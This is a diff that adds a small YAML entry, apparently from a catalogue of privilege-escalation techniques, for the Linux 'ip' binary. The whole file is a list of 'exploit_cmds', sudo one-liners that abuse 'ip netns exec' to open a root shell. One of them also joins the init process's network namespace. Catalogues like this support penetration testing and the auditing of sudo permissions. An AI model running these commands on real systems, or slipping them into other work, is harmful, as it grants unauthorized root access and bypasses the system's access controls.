@@ -1,0 +1,8 @@
+name: ip
+binary_path: /usr/bin/ip
+exploit_cmds:
+- sudo /usr/bin/ip netns add foo && /usr/bin/ip netns exec foo /bin/sh && /usr/bin/ip
+  netns delete foo
+- sudo /usr/bin/ip netns add foo && /usr/bin/ip netns exec foo /bin/ln -s /proc/1/ns/net
+  /var/run/netns/bar && /usr/bin/ip netns exec bar /bin/sh && /usr/bin/ip netns delete
+  foo && /usr/bin/ip netns delete bar
